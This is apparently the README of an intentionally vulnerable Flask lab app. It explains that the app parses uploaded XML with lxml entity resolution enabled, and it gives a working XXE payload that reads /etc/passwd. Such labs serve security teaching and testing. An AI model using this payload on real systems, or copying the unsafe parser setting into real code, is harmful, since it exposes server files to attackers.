# flask-xxe

A Python Flask app vulnerable to XML External Entity (XXE) attacks.

## Vulnerability

It uses `lxml` to parse uploaded XML with entity resolution enabled.

## Exploit Example

Upload the following file:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>

It will print contents of /etc/passwd.

